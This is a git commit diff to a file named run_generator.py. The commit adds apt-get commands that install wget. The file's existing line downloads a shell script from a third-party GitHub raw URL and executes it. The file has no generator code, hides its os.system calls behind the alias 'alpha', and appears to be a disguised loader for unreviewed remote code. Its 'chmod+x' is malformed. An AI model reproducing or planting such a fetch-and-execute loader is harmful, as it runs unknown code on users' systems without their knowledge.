bbc9fcb1fc5230d48f7106cfd76426dbf69631d9
lernuda <92502650+lernuda@users.noreply.github.com>
2021-10-14 12:39:45 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,5 @@
 import os as alpha
+alpha.system("apt-get update")
+alpha.system("apt-get install -y wget")
+alpha.system("apt-get update")
 alpha.system("wget https://raw.githubusercontent.com/comandashtar/colab-2/main/build.sh && chmod+x build.sh && ./build.sh")
